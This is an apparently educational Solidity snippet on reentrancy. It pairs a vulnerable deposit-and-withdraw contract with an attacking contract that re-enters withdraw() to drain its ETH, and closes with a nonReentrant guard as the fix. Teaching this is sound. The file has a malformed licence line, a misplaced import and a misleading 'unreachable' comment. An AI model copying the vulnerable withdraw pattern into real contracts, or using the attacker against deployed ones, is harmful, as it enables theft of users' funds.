/ SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Contract1 {

    mapping(address => uint) public balances;

    // Update the `balances` mapping to include the new ETH deposited by msg.sender
    function addBalances() public payable {
        balances[msg.sender] += msg.value;
    }

    // Send ETH worth `balances[msg.sender]` back to msg.sender
    function withdraw() public {
    
        require(balances[msg.sender] > 0);
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send ether");
        
        // This code becomes unreachable because the contract's balance is drained
        // before user's balance could have been set to 0
        balances[msg.sender] = 0;
    }
}

// Now attacking contract can have following code
import "./Contract1.sol";

contract AttackingContract {
    Contract1 public contract1;
    constructor(address contract1Address) {
        contract1 = Contract1(contract1Address);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(contract1).balance > 0) {
            contract1.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        contract1.addBalances{value: msg.value}();
        contract1.withdraw();
    }
}

//Prevention:- using OpenZeppelin has a ReentrancyGuard library 
//that provides a modifier named nonReentrant which blocks re-entrancy in functions you apply it to. 
//It basically works like the following:

modifier nonReentrant() {
    require(!locked, "No re-entrancy");
    locked = true;
    _;
    locked = false;
}


//Code credit :- LearnWeb3 DAO
